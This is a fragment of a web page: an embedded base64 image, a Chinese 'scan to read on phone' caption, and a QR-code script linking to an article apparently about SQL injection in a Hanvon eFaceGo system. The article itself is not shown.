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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-searchSystemRoles-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 